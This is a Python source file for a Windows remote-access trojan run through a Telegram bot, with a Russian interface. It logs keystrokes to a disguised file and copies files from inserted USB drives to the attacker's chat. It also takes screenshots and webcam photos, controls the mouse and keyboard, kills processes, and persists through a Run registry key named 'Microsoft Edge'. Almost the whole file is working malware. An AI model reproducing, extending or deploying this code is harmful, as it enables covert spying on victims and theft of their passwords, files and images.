import ctypes
import os
import pythoncom
import telebot
import threading
import platform
import getpass
import psutil
import pyautogui
import time
import cv2
import sys
import shutil
import winreg
import keyboard
import webbrowser
from PIL import Image, ImageDraw, ImageFont
from pycaw.pycaw import AudioUtilities
from pycaw.pycaw import IAudioEndpointVolume

BOT_TOKEN = "<your_token_here>"
ALLOWED_USER_ID = <your_user_id_here>
bot = telebot.TeleBot(BOT_TOKEN)
#BOT_TOKEN = "<your_token_her.e>"
#ALLOWED_USER_ID = "<your_user_idc_here>"


bot.remove_webhook()


SECRET_KEYWORD = "aren2007"
user_verified = {}

bot.send_message(ALLOWED_USER_ID, "Программа начала работу, нажми /start")
hidden_folder = os.path.expanduser("~\\AppData\\Local\\Microsoft Edge")
file_name = "soundInformation.txt"
file_path = os.path.join(hidden_folder, file_name)

if not os.path.exists(hidden_folder):
    os.makedirs(hidden_folder)

if os.path.exists(file_path):
    with open(file_path, "r+", encoding="utf-8") as f:
        if f.read():
            f.seek(0)
            f.truncate()


def increase_volume():
    try:

        pythoncom.CoInitialize()


        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, 1, None)


        volume = interface.QueryInterface(IAudioEndpointVolume)

        current_volume = volume.GetMasterVolumeLevelScalar()


        new_volume = min(current_volume + 0.05, 1.0)
        volume.SetMasterVolumeLevelScalar(new_volume, None)



        pythoncom.CoUninitialize()

    except Exception as e:

        pythoncom.CoUninitialize()



def decrease_volume():
    try:

        pythoncom.CoInitialize()


        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, 1, None)


        volume = interface.QueryInterface(IAudioEndpointVolume)

        current_volume = volume.GetMasterVolumeLevelScalar()


        new_volume = max(current_volume - 0.05, 0.0)
        volume.SetMasterVolumeLevelScalar(new_volume, None)



        pythoncom.CoUninitialize()

    except Exception as e:

        pythoncom.CoUninitialize()




# Command to decrease volume


def openUrl(url):
    webbrowser.open(url)
# Copy the program to the folder where the txt file is stored
def copy_program_to_folder():
    os.startfile("C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe")
    program_path = sys.argv[0]  # The script or executable path

    target_folder = hidden_folder

    try:
        # Only copy if the file doesn't already exist in the folder
        target_path = os.path.join(target_folder, os.path.basename(program_path))
        if not os.path.exists(target_path):
            shutil.copy(program_path, target_path)

    except Exception as e:
        print(f"Error copying program: {e}")


copy_program_to_folder()


def remove_edge_from_startup():

    startup_registry_paths = [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
    ]

    for path in startup_registry_paths:
        try:
            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_READ | winreg.KEY_WRITE)


            index = 0
            while True:
                try:
                    name, value, _ = winreg.EnumValue(reg_key, index)
                    if 'msedge.exe' in value.lower():


                        winreg.DeleteValue(reg_key, name)

                        break
                    index += 1
                except OSError:
                    break
            winreg.CloseKey(reg_key)
        except FileNotFoundError:
            print(f"Registry path not found: {path}")
        except Exception as e:
            print(f"Error: {str(e)}")


def add_edge_to_startup():
    # Path to the Microsoft Edge executable
    edge_path = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"

    if not os.path.exists(edge_path):
        print("Microsoft Edge not found at the expected location.")
        return

    # Registry paths for startup entries
    startup_registry_paths = [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
    ]

    # Add the Microsoft Edge to the startup registry
    for path in startup_registry_paths:
        try:
            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_WRITE)

            # Add the Edge entry to startup
            winreg.SetValueEx(reg_key, "MicrosoftEdge", 0, winreg.REG_SZ, edge_path)
            print("Microsoft Edge added to startup.")

            winreg.CloseKey(reg_key)
            break
        except FileNotFoundError:
            print(f"Registry path not found: {path}")
        except Exception as e:
            print(f"Error: {str(e)}")



def copy_files_from_usb(usb_path):
    for item in os.listdir(usb_path):
        source_path = os.path.join(usb_path, item)
        destination_path = os.path.join(hidden_folder, item)

        if item == file_name:
            continue

        try:

            if os.path.isfile(source_path):
                shutil.copy(source_path, destination_path)

                with open(destination_path, "rb") as file:
                    bot.send_document(ALLOWED_USER_ID, file)


        except Exception as e:
            print(f"Error copying {item}: {e}")

def check_for_usb():
    already_checked = set()
    while True:

        for partition in psutil.disk_partitions():

            if 'removable' in partition.opts:
                usb_path = partition.mountpoint
                if usb_path not in already_checked:
                    already_checked.add(usb_path)
                    bot.send_message(ALLOWED_USER_ID, "Обнаружено USB-устройство, пытаюсь скопировать данные")

                    copy_files_from_usb(usb_path)
        time.sleep(1)


threading.Thread(target=check_for_usb, daemon=True).start()

def set_wallpaper_with_text(user_text):

    pyautogui.hotkey('win', 'd')

    image = Image.new("RGB", (1920, 1080), (255, 255, 255))  # White background


    try:
        font = ImageFont.truetype("arial.ttf", 100)
    except IOError:
        font = ImageFont.load_default()


    draw = ImageDraw.Draw(image)


    bbox = draw.textbbox((0, 0), user_text, font=font)
    text_width = bbox[2] - bbox[0]
    text_height = bbox[3] - bbox[1]

    text_x = (image.width - text_width) // 2
    text_y = (image.height - text_height) // 2


    draw.text((text_x, text_y), user_text, fill=(0, 0, 0), font=font)  # Black text


    wallpaper_path = os.path.join(os.getcwd(), "user_wallpaper.jpg")
    image.save(wallpaper_path)


    ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)



def log_keystrokes():
    def process_key(event):
        key = event.name

        # Ignore NoneType keys
        if key is None:
            return

        with open(file_path, "a", encoding="utf-8") as file:
            if key == "space":
                file.write(" ")
            elif key == "enter":
                file.write("\n")
            elif key == "backspace":
                file.write(" <Delete> ")
            elif len(key) == 1:
                file.write(key)
            else:
                file.write(f" <{key.upper()}> ")

    keyboard.on_press(process_key)
    keyboard.wait()



threading.Thread(target=log_keystrokes, daemon=True).start()



def terminate(ProcessName):
    os.system('taskkill /IM "' + ProcessName + '" /F')









def send_screenshot(chat_id):
    screenshot = pyautogui.screenshot()
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)

    with open(screenshot_path, "rb") as photo:
        bot.send_photo(chat_id, photo)

    os.remove(screenshot_path)



def send_camera_photo(chat_id):
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        bot.send_message(chat_id, " Не удалось подключиться к камере")
        return

    ret, frame = cap.read()

    if ret:
        photo_path = "camera_photo.jpg"
        cv2.imwrite(photo_path, frame)

        with open(photo_path, "rb") as photo:
            bot.send_photo(chat_id, photo)

        os.remove(photo_path)


    cap.release()



def shutdown_pc():
    os.system("shutdown /s /f /t 0")



def restart_pc():
    os.system("shutdown /r /f /t 0")



def add_to_startup():
    remove_edge_from_startup()
    if platform.system() == "Windows":
        reg_key = winreg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_name = "Microsoft Edge"

        try:

            winreg.CreateKey(reg_key, reg_path)
            with winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, reg_name, 0, winreg.REG_SZ, sys.argv[0])
            return True
        except Exception as e:
            print(f"Error adding to startup: {e}")
            return False
    return False



def rename_program_to_edge(program_path):
    new_name = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
    try:

        shutil.move(program_path, new_name)
        print(f"Файл переименован в {new_name}.")
    except Exception as e:
        print(f"Ошибка при переименовании файла: {e}")
def remove_from_startup():
    add_edge_to_startup()
    if platform.system() == "Windows":
        reg_key = winreg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_name = "Microsoft Edge"

        try:
            with winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_WRITE) as key:
                winreg.DeleteValue(key, reg_name)
            return True
        except Exception as e:
            print(f"Error removing from startup: {e}")
            return False
    return False



def kill_program():
    try:
        pid = os.getpid()
        process = psutil.Process(pid)
        process.terminate()
        print("Process killed successfully")
    except Exception as e:
        print(f"Error killing process: {e}")


def delete_program_from_pc():
    try:
        program_path = sys.argv[0]
        time.sleep(1)
        if os.path.exists(program_path):
            os.remove(program_path)
            print(f"Program {program_path} has been deleted from the system.")
        else:
            print("Program file not found.")
    except Exception as e:
        print(f"Error deleting program: {e}")



def main_menu():
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)


    control_buttons = [
        telebot.types.KeyboardButton("📄 Получить Нажатия"),

    ]

    system_buttons = [
        telebot.types.KeyboardButton("📸 Скриншот"),
        telebot.types.KeyboardButton("📷 Фото"),
        telebot.types.KeyboardButton("🔌 Выключить компьютер"),
        telebot.types.KeyboardButton("🔄 Перезагрузить компьютер"),
    ]

    maintenance_buttons = [
        telebot.types.KeyboardButton("🗑️ Удалить Txt файл"),
        telebot.types.KeyboardButton("🗑️ Удалить программу"),
    ]

    startup_buttons = [
        telebot.types.KeyboardButton("➕ Добавить в автозапуск"),
        telebot.types.KeyboardButton("➖ Убрать из автозапуска"),
    ]

    wallpaper_buttons = [
        telebot.types.KeyboardButton("🖥️ Установить текст на рабочий стол"),
        telebot.types.KeyboardButton("🖼️ Установить обои"),
    ]

    url_buttons = [
        telebot.types.KeyboardButton("🔗 Ссылка"),
    ]

    volume_buttons = [
        telebot.types.KeyboardButton("🔊 Увеличить громкость"),
        telebot.types.KeyboardButton("🔉 Уменьшить громкость"),
    ]


    btn_keyboard_mouse = telebot.types.KeyboardButton("⌨️ Клавиатура + Управление")
    help_btn=telebot.types.KeyboardButton("❓ Помощь")
    markup.add(btn_keyboard_mouse)
    markup.add(*volume_buttons)
    markup.add(*system_buttons)
    markup.add(*control_buttons)
    markup.add(*maintenance_buttons)
    markup.add(*startup_buttons)
    markup.add(*wallpaper_buttons)
    markup.add(*url_buttons)



    markup.add(help_btn)
    return markup



@bot.message_handler(commands=["start"])
def start(message):
    user = message.from_user
    bot.set_my_description(description=(
        "Этот бот позволяет:\n"
        "1️⃣ Управлять мышью: двигайте курсор, выполняйте клики.\n"
        "2️⃣ Использовать телефон как клавиатуру: вводите текст прямо с телефона.\n"
        "3️⃣ Управлять громкостью: регулируйте громкость компьютера.\n"
        "4️⃣ Получать изображения с камеры: сделайте фото с подключённой камеры компьютера.\n"
        "5️⃣ Делать скриншоты: снимайте экран и отправляйте изображения в чат.\n"
        "6️⃣ Записывать нажатия клавиш (keylogger): отслеживайте ввод на клавиатуре.\n\n"
        "Для начала работы нажмите /start."
    ))
    bot.set_my_short_description(short_description=(
        "Управляйте мышью, клавиатурой, громкостью, снимайте фото и скриншоты, отслеживайте ввод. Автор: @psmib."
    ))

    print(f"User {user.username} started the bot")



    if user.id in user_verified and user_verified[user.id]:

        return

    if user.id == ALLOWED_USER_ID:
        user_verified[user.id] = True
        bot.send_message(user.id, "Главное меню", reply_markup=main_menu())



@bot.message_handler(func=lambda message: message.text == "⌨️ Клавиатура + Управление")
def show_keyboard_mouse_submenu(message):
    user = message.from_user
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)

    mouse_btn = [
        telebot.types.KeyboardButton("⬆️ Вверх"),
        telebot.types.KeyboardButton("⬇️ Вниз"),
        telebot.types.KeyboardButton("⬅️ Влево"),
        telebot.types.KeyboardButton("➡️ Вправо"),
        telebot.types.KeyboardButton("🖱️ Левый клик"),
        telebot.types.KeyboardButton("🖱️ Правый клик")
    ]
    btn_print = telebot.types.KeyboardButton("⌨️ Клавиатура")
    btn_cancel = telebot.types.KeyboardButton("🔙 Назад")

    markup.add(*mouse_btn)
    markup.add(btn_print)
    markup.add(btn_cancel)

    bot.send_message(user.id, "Меню управления", reply_markup=markup)


@bot.message_handler(
    func=lambda message: message.text.startswith("⬆️ Вверх") or message.text.startswith("⬇️ Вниз") or
    message.text.startswith("⬅️ Влево") or message.text.startswith("➡️ Вправо") or
    message.text == "🖱️ Левый клик" or message.text == "🖱️ Правый клик")
def control_mouse(message):
    if message.text == "⬆️ Вверх":
        pyautogui.move(0, -50)
    elif message.text == "⬇️ Вниз":
        pyautogui.move(0, 50)
    elif message.text == "⬅️ Влево":
        pyautogui.move(-50, 0)
    elif message.text == "➡️ Вправо":
        pyautogui.move(50, 0)
    elif message.text == "🖱️ Левый клик":
        pyautogui.click()
    elif message.text == "🖱️ Правый клик":
        pyautogui.rightClick()
    bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)


@bot.message_handler(func=lambda message: message.text== "❓ Помощь")
def help(message):
    user=message.from_user
    bot.send_message(message.chat.id, "Если у вас возникли вопросы, напишите сюда: [Поддержка](https://t.me/psmib).")

@bot.message_handler(func=lambda message: message.text == "🔙 Назад")
def cancel(message):
    user = message.from_user
    bot.send_message(user.id, "Возврат в главное меню", reply_markup=main_menu())

awaiting_image_for_wallpaper = {}


@bot.message_handler(
    func=lambda message: message.text == "🖼️ Установить обои" and user_verified.get(message.from_user.id, False))
def request_wallpaper_image(message):
    awaiting_image_for_wallpaper[message.from_user.id] = True
    bot.send_message(message.chat.id, "Пожалуйста, отправьте изображение, которое хотите установить в качестве обоев.")

@bot.message_handler(func=lambda message: message.text == "⬆️ Вверх")
def move_up(message):
    x, y = pyautogui.position()
    pyautogui.moveTo(x, y - 50)

@bot.message_handler(func=lambda message: message.text == "⬇️ Вниз")
def move_down(message):
    x, y = pyautogui.position()
    pyautogui.moveTo(x, y + 50)

@bot.message_handler(func=lambda message: message.text == "⬅️ Влево")
def move_left(message):
    x, y = pyautogui.position()
    pyautogui.moveTo(x - 50, y)

@bot.message_handler(func=lambda message: message.text == "➡️ Вправо")
def move_right(message):
    x, y = pyautogui.position()
    pyautogui.moveTo(x + 50, y)

@bot.message_handler(func=lambda message: message.text == "🖱️ Левый клик")
def mouse_click(message):
    pyautogui.click()

awaiting_text_input = False

@bot.message_handler(func=lambda message: message.text == "⌨️ Клавиатура")
def handle_print_button(message):
    global awaiting_text_input
    awaiting_text_input = True


@bot.message_handler(func=lambda message: awaiting_text_input)
def handle_text_input(message):
    global awaiting_text_input
    awaiting_text_input = False
    pyautogui.write(message.text)



@bot.message_handler(content_types=["photo"])
def set_wallpaper_from_image(message):
    if not awaiting_image_for_wallpaper.get(message.from_user.id, False):
        return

    file_info = bot.get_file(message.photo[-1].file_id)
    downloaded_file = bot.download_file(file_info.file_path)

    image_path = "new_wallpaper.jpg"
    with open(image_path, "wb") as image_file:
        image_file.write(downloaded_file)

    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(image_path), 3)
        bot.send_message(message.chat.id, "Изображение установлено в качестве обоев.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка: {e}")
    finally:
        awaiting_image_for_wallpaper[message.from_user.id] = False


waiting_for_url = {}

@bot.message_handler(func=lambda message: message.text == "🔗 Ссылка" and user_verified.get(message.from_user.id, False))
def request_url(message):
    waiting_for_url[message.from_user.id] = True
    bot.send_message(message.chat.id, "Пожалуйста, отправьте URL, который хотите открыть.")

@bot.message_handler(func=lambda message: waiting_for_url.get(message.from_user.id, False))
def open_user_url(message):
    url = message.text
    if not (url.startswith("http://") or url.startswith("https://")):
        bot.send_message(message.chat.id, "Неверный URL: Пожалуйста, убедитесь, что URL начинается с 'http://' или 'https://'")
        return

    try:
        webbrowser.open(url)
        bot.send_message(message.chat.id, f"Открыт URL: {url}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка при открытии URL: {e}")
    finally:
        waiting_for_url[message.from_user.id] = False

waiting_for_text = {}

@bot.message_handler(func=lambda message: message.text == "🖥️ Установить текст на рабочий стол" and user_verified.get(message.from_user.id, False))
def handle_set_wallpaper_text(message):
    waiting_for_text[message.from_user.id] = True
    bot.send_message(message.chat.id, "Пожалуйста, введите текст для изображения.")

@bot.message_handler(func=lambda message: waiting_for_text.get(message.from_user.id, False))
def save_text_and_set_wallpaper(message):
    user_text = message.text
    bot.send_message(message.chat.id, "Минимизируйте экраны, мы добавим ваш текст на изображение.")
    threading.Thread(target=set_wallpaper_with_text, args=(user_text,)).start()

    waiting_for_text[message.from_user.id] = False

@bot.message_handler(func=lambda message: message.text == "🔊 Увеличить громкость")
def increase_volume_button_handler(message):
    print(f"Получена команда увеличения громкости от {message.from_user.username}")
    increase_volume()
    bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)

@bot.message_handler(func=lambda message: message.text == "🔉 Уменьшить громкость")
def decrease_volume_button_handler(message):
    print(f"Получена команда уменьшения громкости от {message.from_user.username}")
    decrease_volume()
    bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)


@bot.message_handler(func=lambda message: message.text == "📄 Получить Нажатия" and user_verified.get(message.from_user.id, False))
def send_key_logs(message):
    user = message.from_user
    if os.path.exists(file_path):
        try:
            with open(file_path, "r", encoding="utf-8") as file:
                key_logs = file.read()
                if key_logs:
                    bot.send_message(message.chat.id, key_logs)
                else:
                    bot.send_message(message.chat.id, "Нет нажатий клавиш.")
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка: {e}")
    else:
        bot.send_message(message.chat.id, "Файл Txt не найден.")


@bot.message_handler(func=lambda message: message.text == "📸 Скриншот" and user_verified.get(message.from_user.id, False))
def send_screenshot_handler(message):
    send_screenshot(message.chat.id)


@bot.message_handler(func=lambda message: message.text == "📷 Фото" and user_verified.get(message.from_user.id, False))
def send_camera_photo_handler(message):
    send_camera_photo(message.chat.id)


@bot.message_handler(
    func=lambda message: message.text == "🗑️ Удалить Txt файл" and user_verified.get(message.from_user.id, False))
def delete_txt_file(message):
    if os.path.exists(file_path):
        os.remove(file_path)
        bot.send_message(message.chat.id, "Файл Txt удалён.")
    else:
        bot.send_message(message.chat.id, "Файл Txt не найден.")


@bot.message_handler(
    func=lambda message: message.text == "🗑️ Удалить программу" and user_verified.get(message.from_user.id, False))
def delete_program_handler(message):
    delete_program_from_pc()
    bot.send_message(message.chat.id, "Программа удалена.")


@bot.message_handler(
    func=lambda message: message.text == "🔌 Выключить компьютер" and user_verified.get(message.from_user.id, False))
def shutdown_handler(message):
    shutdown_pc()
    bot.send_message(message.chat.id, "Компьютер выключается.")


@bot.message_handler(
    func=lambda message: message.text == "🔄 Перезагрузить компьютер" and user_verified.get(message.from_user.id, False))
def restart_handler(message):
    restart_pc()
    bot.send_message(message.chat.id, "Компьютер перезагружается.")


@bot.message_handler(
    func=lambda message: message.text == "➕ Добавить в автозапуск" and user_verified.get(message.from_user.id, False))
def add_to_startup_handler(message):
    if add_to_startup():
        bot.send_message(message.chat.id, "Программа добавлена в автозапуск.")
    else:
        bot.send_message(message.chat.id, "Ошибка. Не удалось добавить программу.")


@bot.message_handler(
    func=lambda message: message.text == "➖ Убрать из автозапуска" and user_verified.get(message.from_user.id, False))
def remove_from_startup_handler(message):
    if remove_from_startup():
        bot.send_message(message.chat.id, "Программа удалена из автозапуска.")
    else:
        bot.send_message(message.chat.id, "Ошибка. Не удалось удалить программу.")


@bot.message_handler(commands=['processkill'])
def processkill(message):
    command_text = message.text.strip().lower()
    if len(command_text.split()) < 2:
        bot.send_message(message.chat.id, "Укажите имя процесса (например, /processkill chrome.exe)")
        return

    process_name = command_text.split()[1]

    try:
        terminate(process_name)
        bot.send_message(message.chat.id, f"Процесс {process_name} успешно завершён.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка: {e}")



bot.polling(none_stop=True)

